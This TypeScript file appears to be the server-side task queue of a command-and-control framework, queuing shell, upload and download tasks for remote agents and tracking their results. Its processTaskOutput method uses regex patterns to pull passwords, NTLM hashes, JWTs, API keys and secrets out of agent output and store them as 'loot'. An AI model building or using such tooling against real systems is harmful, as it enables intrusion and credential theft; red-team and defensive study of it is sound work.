import { PrismaClient, Task } from '@prisma/client';
import { getIo } from '../socket.js';

const prisma = new PrismaClient();

/**
 * TaskQueueService - Manages the command queue for agent tasking
 * Handles creation, retrieval, and completion of tasks sent to agents
 */

export interface CreateTaskInput {
    type: 'shell' | 'module' | 'upload' | 'download';
    command: string;
    arguments?: Record<string, any>;
    priority?: number; // 1-10, lower = higher priority
    userId?: string;
}

export interface TaskResult {
    success: boolean;
    output?: string;
    error?: string;
}

class TaskQueueService {
    /**
     * Create a new task for an agent
     */
    async createTask(agentId: string, task: CreateTaskInput): Promise<Task> {
        const newTask = await prisma.task.create({
            data: {
                agentId,
                type: task.type,
                command: task.command,
                arguments: task.arguments ? JSON.stringify(task.arguments) : null,
                priority: task.priority || 5,
                createdBy: task.userId || null,
                status: 'pending'
            }
        });

        // Emit Socket.IO event for real-time UI update
        try {
            getIo().emit('task_created', {
                taskId: newTask.id,
                agentId,
                type: newTask.type,
                command: newTask.command,
                status: newTask.status
            });
        } catch (e) {
            console.warn('Socket.IO not available for task_created event');
        }

        return newTask;
    }

    /**
     * Get pending tasks for an agent and mark them as sent
     * Called when agent checks in
     */
    async getPendingTasks(agentId: string, limit: number = 10): Promise<Task[]> {
        // Get pending tasks ordered by priority (lower = higher priority) and creation time
        const tasks = await prisma.task.findMany({
            where: {
                agentId,
                status: 'pending'
            },
            orderBy: [
                { priority: 'asc' },
                { createdAt: 'asc' }
            ],
            take: limit
        });

        if (tasks.length === 0) {
            return [];
        }

        // Mark tasks as sent
        const taskIds = tasks.map(t => t.id);
        await prisma.task.updateMany({
            where: { id: { in: taskIds } },
            data: {
                status: 'sent',
                sentAt: new Date()
            }
        });

        // Emit Socket.IO events
        try {
            for (const task of tasks) {
                getIo().emit('task_sent', {
                    taskId: task.id,
                    agentId,
                    status: 'sent'
                });
            }
        } catch (e) {
            console.warn('Socket.IO not available for task_sent events');
        }

        return tasks;
    }

    /**
     * Get all tasks for an agent (any status)
     */
    async getAgentTasks(agentId: string, status?: string): Promise<Task[]> {
        return prisma.task.findMany({
            where: {
                agentId,
                ...(status && { status })
            },
            orderBy: { createdAt: 'desc' }
        });
    }

    /**
     * Get a specific task by ID
     */
    async getTask(taskId: string): Promise<Task | null> {
        return prisma.task.findUnique({
            where: { id: taskId }
        });
    }

    /**
     * Complete a task with results
     */
    async completeTask(taskId: string, result: TaskResult): Promise<Task> {
        const task = await prisma.task.update({
            where: { id: taskId },
            data: {
                status: result.success ? 'completed' : 'failed',
                output: result.output || null,
                error: result.error || null,
                completedAt: new Date()
            }
        });

        // Emit Socket.IO event
        try {
            getIo().emit('task_completed', {
                taskId: task.id,
                agentId: task.agentId,
                type: task.type,
                command: task.command,
                status: task.status,
                output: task.output,
                error: task.error,
                completedAt: task.completedAt
            });
        } catch (e) {
            console.warn('Socket.IO not available for task_completed event');
        }

        // Process task output for loot extraction if successful
        if (result.success && result.output) {
            await this.processTaskOutput(task, result.output);
        }

        return task;
    }

    /**
     * Process task output to extract loot (credentials, files, etc.)
     */
    private async processTaskOutput(task: Task, output: string): Promise<void> {
        // Check for credential patterns in output
        const credentialPatterns = [
            /password[:\s]+[\w!@#$%^&*]+/gi,
            /ntlm[:\s]+[a-f0-9]+/gi,
            /hash[:\s]+[a-f0-9]+/gi,
            /bearer\s+[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+/gi, // JWT
            /api[_-]?key[:\s]+[\w\-]+/gi,
            /secret[:\s]+[\w\-]+/gi
        ];

        for (const pattern of credentialPatterns) {
            const matches = output.match(pattern);
            if (matches) {
                for (const match of matches) {
                    await prisma.loot.create({
                        data: {
                            id: `loot-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
                            agentId: task.agentId,
                            type: 'credential',
                            source: `task:${task.id}`,
                            content: match,
                            timestamp: new Date(),
                            confidence: 70
                        }
                    });

                    try {
                        getIo().emit('new_loot', {
                            agentId: task.agentId,
                            type: 'credential',
                            source: `task:${task.id}`
                        });
                    } catch (e) {
                        // Ignore Socket.IO errors
                    }
                }
            }
        }
    }

    /**
     * Cancel a pending task
     */
    async cancelTask(taskId: string): Promise<Task | null> {
        const task = await prisma.task.findUnique({
            where: { id: taskId }
        });

        if (!task || task.status !== 'pending') {
            return null; // Can only cancel pending tasks
        }

        const cancelled = await prisma.task.update({
            where: { id: taskId },
            data: {
                status: 'failed',
                error: 'Cancelled by user',
                completedAt: new Date()
            }
        });

        try {
            getIo().emit('task_cancelled', {
                taskId: cancelled.id,
                agentId: cancelled.agentId
            });
        } catch (e) {
            // Ignore Socket.IO errors
        }

        return cancelled;
    }

    /**
     * Get task statistics for an agent
     */
    async getAgentTaskStats(agentId: string): Promise<{
        total: number;
        pending: number;
        sent: number;
        completed: number;
        failed: number;
    }> {
        const tasks = await prisma.task.groupBy({
            by: ['status'],
            where: { agentId },
            _count: true
        });

        const stats = {
            total: 0,
            pending: 0,
            sent: 0,
            completed: 0,
            failed: 0
        };

        for (const group of tasks) {
            stats.total += group._count;
            if (group.status === 'pending') stats.pending = group._count;
            if (group.status === 'sent') stats.sent = group._count;
            if (group.status === 'completed') stats.completed = group._count;
            if (group.status === 'failed') stats.failed = group._count;
        }

        return stats;
    }

    /**
     * Clean up old completed/failed tasks
     */
    async cleanupOldTasks(maxAgeDays: number = 30): Promise<number> {
        const cutoff = new Date();
        cutoff.setDate(cutoff.getDate() - maxAgeDays);

        const result = await prisma.task.deleteMany({
            where: {
                status: { in: ['completed', 'failed'] },
                completedAt: { lt: cutoff }
            }
        });

        return result.count;
    }

    /**
     * Retry a failed task by creating a new one with the same parameters
     */
    async retryTask(taskId: string): Promise<Task | null> {
        const originalTask = await prisma.task.findUnique({
            where: { id: taskId }
        });

        if (!originalTask || originalTask.status !== 'failed') {
            return null;
        }

        return this.createTask(originalTask.agentId, {
            type: originalTask.type as 'shell' | 'module' | 'upload' | 'download',
            command: originalTask.command,
            arguments: originalTask.arguments ? JSON.parse(originalTask.arguments) : undefined,
            priority: originalTask.priority,
            userId: originalTask.createdBy || undefined
        });
    }
}

// Singleton instance
export const taskQueueService = new TaskQueueService();

// Export class for testing
export { TaskQueueService };
